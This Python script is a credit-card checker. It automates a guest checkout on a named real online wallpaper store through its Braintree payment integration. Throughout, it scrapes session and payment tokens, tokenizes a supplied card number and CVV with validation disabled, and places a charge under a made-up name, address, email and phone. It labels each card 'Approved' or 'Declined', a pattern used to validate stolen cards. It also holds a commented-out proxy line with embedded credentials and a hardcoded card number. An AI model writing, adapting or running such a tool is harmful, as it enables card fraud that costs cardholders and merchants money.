
import requests, random, base64, secrets, uuid, re, json

def getstr(text: str, a: str, b: str) -> str:
    try:
        return text.split(a)[1].split(b)[0]
    except IndexError:
        return None
    
def card_parse(card):
    
    cc, month, year, cvv = re.split(r'\s*[|/]\s*|\s+', card)
    month = month.zfill(2)
    year = f"20{year}" if len(year) == 2 else year
    
    return cc, month, year, cvv


from retry import retry

@retry(tries=3)
def Charged_braintree(cc):
    session = requests.Session()
 #   session.proxies.update({"http://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060","https://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060",})
    email = f"{str(uuid.uuid4())[:8]}@gmail.com"
    phone = ''.join([str(random.randint(0, 9)) for _ in range(10)])
    sessionid = str(uuid.uuid4())
    correlationid = secrets.token_hex(16)
    cc, month, year, cvv = card_parse(cc)

    # ----- req1 ----- #
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'es-ES,es;q=0.9',
        'priority': 'u=0, i',
        'referer': 'https://www.magicmurals.com/wallpaper/traditional-patterns.html?p=2',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    }

    req1 = session.get('https://www.magicmurals.com/garden-flowers-fot-pat66234091.html', headers=headers)
    form_key = getstr(req1.text,'name="form_key" type="hidden" value="','"')
    if form_key is None:
        raise Exception('Error in req1: Getting form_key.')
    
    # ----- req2 ----- #
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'es-ES,es;q=0.9',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryG4CMJzwjL22lfkjE',
        'origin': 'https://www.magicmurals.com',
        'priority': 'u=1, i',
        'referer': 'https://www.magicmurals.com/garden-flowers-fot-pat66234091.html',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        'cookie': f'form_key={form_key}',
    }

    params = {
        'product': '16723',
        'selected_configurable_option': '',
        'related_product': '',
        'item': '16723',
        'form_key': form_key,
        'options[214600]': '539074',
        'options[214599]': '539071',
        'options[214598]': '539067',
        'options[214595]': '',
        'options[214594]': '',
        'options[214597]': '',
        'options[214596]': '',
        'options[214593]': '539049',
        'options[214592]': '539042',
        'options[214591]': '539040',
        'options[214590]': '32',
        'qty': '1',
        '_8390c8cf': '1743381635',
    }

    req2 = session.post(
        'https://www.magicmurals.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cubWFnaWNtdXJhbHMuY29tL2dhcmRlbi1mbG93ZXJzLWZvdC1wYXQ2NjIzNDA5MS5odG1s/product/16723/',
        headers=headers,
        params=params,
    )
    cookies = req2.cookies
    phpsessid = cookies.get('PHPSESSID')
    
    # ----- req3 ----- #
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'es-ES,es;q=0.9',
        'priority': 'u=0, i',
        'referer': 'https://www.magicmurals.com/checkout/cart/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessid+ '',
    }

    req3 = session.get('https://www.magicmurals.com/checkout/', headers=headers)
    cartid = getstr(req3.text, '"entity_id":"', '"')
    b_token_encrypted = getstr(req3.text, '"clientToken":"', '"')
    b_token_decrypted = str(base64.b64decode(b_token_encrypted))
    btoken = getstr(b_token_decrypted, '"authorizationFingerprint":"', '","')
    b_token = "Bearer "+btoken

        
    # ----- req4 ----- #
    headers = {
        'accept': '*/*',
        'accept-language': 'es-ES,es;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.magicmurals.com',
        'priority': 'u=1, i',
        'referer': 'https://www.magicmurals.com/checkout/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        'cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessid+ '',
    }

    json_data = {
        'addressInformation': {
            'shipping_address': {
                'countryId': 'US',
                'regionId': '54',
                'regionCode': 'SC',
                'region': 'South Carolina',
                'street': [
                    '909 Houston Northcutt Boulevard',
                    '',
                    '',
                ],
                'company': '',
                'telephone': phone,
                'postcode': '29464',
                'city': 'Mount Pleasant',
                'firstname': 'Anne',
                'lastname': 'Lois',
                'extension_attributes': {},
            },
            'billing_address': {
                'countryId': 'US',
                'regionId': '54',
                'regionCode': 'SC',
                'region': 'South Carolina',
                'street': [
                    '909 Houston Northcutt Boulevard',
                    '',
                    '',
                ],
                'company': '',
                'telephone': phone,
                'postcode': '29464',
                'city': 'Mount Pleasant',
                'firstname': 'Anne',
                'lastname': 'Lois',
                'saveInAddressBook': None,
            },
            'shipping_method_code': 'freeshipping',
            'shipping_carrier_code': 'freeshipping',
            'extension_attributes': {},
        },
    }

    req4 = session.post(
        'https://www.magicmurals.com/rest/default/V1/guest-carts/' +cartid+ '/shipping-information',
        headers=headers,
        json=json_data,
    )

    # ----- req5 ----- #
    
    headers = {
        'accept': '*/*',
        'accept-language': 'es-ES,es;q=0.9',
        'authorization': b_token,
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': sessionid,
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': month,
                    'expirationYear': year,
                    'cvv': cvv,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    req5 = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    token_bc = getstr(req5.text, '"token":"', '"')
    if token_bc is None:
        raise Exception('Error in req5: Getting token_bc')
    
    # ----- req6 ----- #
    headers = {
        'accept': '*/*',
        'accept-language': 'es-ES,es;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.magicmurals.com',
        'priority': 'u=1, i',
        'referer': 'https://www.magicmurals.com/checkout/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        'cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessid+ '',
    }

    json_data = {
        'cartId': cartid,
        'billingAddress': {
            'countryId': 'US',
            'regionId': '54',
            'regionCode': 'SC',
            'region': 'South Carolina',
            'street': [
                '909 Houston Northcutt Boulevard',
                '',
                '',
            ],
            'company': '',
            'telephone': phone,
            'postcode': '29464',
            'city': 'Mount Pleasant',
            'firstname': 'Anne',
            'lastname': 'Lois',
            'saveInAddressBook': None,
            'extension_attributes': {},
        },
        'paymentMethod': {
            'method': 'braintree',
            'additional_data': {
                'payment_method_nonce': token_bc,
                'device_data': '{"correlation_id":"' +correlationid+ '"}',
            },
        },
        'email': email,
    }

    req6 = session.post(
        'https://www.magicmurals.com/rest/default/V1/guest-carts/' +cartid+ '/payment-information',
        headers=headers,
        json=json_data,
    )
    
    if req6.status_code == 200: return 'Approved ✅' ,'Charged 185.92$'
    
    else:
        try:
            message = json.loads(req6.text)
            error = message["message"]
            result = error.split("Your payment could not be taken. Please try again or use a different payment method.", 1)[-1].strip()
            if 'Funds' in result or 'Declined CVV' in result:return 'Approved ✅',result
            else: return "Declined ❌",result
        
        except ValueError:
            return "Declined ❌","Error getting response, check again."



if __name__ == "__main__":
    cc = '4782002076830811|12|2029|392'
    result = Charged_braintree(cc)
    print(result)